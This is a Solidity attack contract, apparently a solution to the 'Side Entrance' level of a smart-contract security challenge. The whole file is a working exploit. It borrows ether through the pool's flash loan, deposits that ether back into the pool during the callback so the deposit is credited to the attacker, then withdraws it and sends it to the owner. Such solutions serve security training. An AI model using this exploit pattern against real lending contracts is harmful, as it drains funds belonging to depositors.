// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive () external payable {
        owner.transfer(address(this).balance);
    }
}